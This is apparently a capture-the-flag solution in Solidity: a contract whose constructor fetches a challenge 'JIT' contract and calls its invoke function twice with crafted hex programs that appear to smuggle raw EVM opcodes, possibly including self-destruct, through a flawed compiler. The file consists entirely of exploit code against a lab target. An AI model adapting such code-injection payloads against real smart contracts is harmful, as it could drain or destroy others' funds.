// SPDX-License-Identifier: GNU AGPLv3

pragma solidity ^0.8.13;

interface ISetup {
    function TARGET() external view returns (IJIT);
}

interface IJIT {
    function invoke(bytes calldata _program, bytes calldata stdin) external;
}

contract Solution {
    constructor(ISetup setup) {
        IJIT jit = setup.TARGET();
        jit.invoke(
            hex"23232323232323232323232323232323232323232323232323235b23235d",
            hex""
        );
        jit.invoke(
            hex"2c2d3c23235b64415bff5d5d23232323232323232323232323235b232323232323",
            hex""
        );
    }
}
